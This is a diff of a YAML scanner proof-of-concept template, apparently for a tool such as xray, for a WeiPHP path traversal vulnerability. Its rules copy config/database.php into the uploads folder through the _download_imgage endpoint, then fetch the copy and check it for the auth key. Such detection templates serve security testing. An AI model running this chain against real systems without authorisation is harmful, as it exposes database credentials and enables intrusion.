@@ -1,29 +1,34 @@
 id: weiphp-path-traversal
 
 info:
-    name: Weiphp Path Traversal
-    author: sakura404x
-    severity: high
+  name: Weiphp Path Traversal
+  author: sakura404x
+  severity: high
+  verified: false
+  description: |
+    Weiphp Path Traversal漏洞，攻击者可以利用该漏洞获取服务器敏感信息。
+  tags: weiphp,path-traversal
+  created: 2025/03/13
 
 rules:
-    r0:
-        request:
-            method: POST
-            path: /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
-            body: |
-                "1":1
-        expression: response.status == 200
-    r1:
-        request:
-            method: GET
-            path: /public/index.php/home/file/user_pics
-        expression: response.status == 200
-        output:
-            search: '"/public/uploads/picture/(?P<img>.+?)\"".bsubmatch(response.body)'
-            img: search["img"]
-    r2:
-        request:
-            method: GET
-            path: /public/uploads/picture/{{img}}
-        expression: response.status == 200 && response.body.bcontains(b"data_auth_key") && response.body.bcontains(b"WeiPHP")
+  r0:
+    request:
+      method: POST
+      path: /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
+      body: |
+        "1":1
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /public/index.php/home/file/user_pics
+    expression: response.status == 200
+    output:
+      search: '"/public/uploads/picture/(?P<img>.+?)\"".bsubmatch(response.body)'
+      img: search["img"]
+  r2:
+    request:
+      method: GET
+      path: /public/uploads/picture/{{img}}
+    expression: response.status == 200 && response.body.bcontains(b"data_auth_key") && response.body.bcontains(b"WeiPHP")
 expression: r0() && r1() && r2()
